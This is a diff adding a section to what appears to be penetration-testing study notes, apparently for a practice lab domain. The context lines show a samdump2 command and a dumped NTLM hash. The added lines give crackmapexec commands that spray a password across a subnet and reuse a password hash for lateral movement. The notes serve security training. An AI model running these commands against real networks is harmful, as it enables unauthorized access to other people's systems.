@@ -64,4 +64,13 @@ samdump2 SYSTEM SAM
 Username:1000:aad3b435b51404eeaad3b435b51404ee:<this>26112010952d963c8dc4217daec986d9</this>:::
 ```
 
+### Pass the Password/Hash wtih crackmapexec
+```
+apt install crackmapexec
 
+# Pass the password around the domain to see where it works
+crackmapexec smb 10.0.3.0/24 -u username -d MARVEL.local -p Password1
+
+# Pass the hash
+crackmapexec smb 10.0.3.0/24 -u username -H <theHashValue> --local
+```
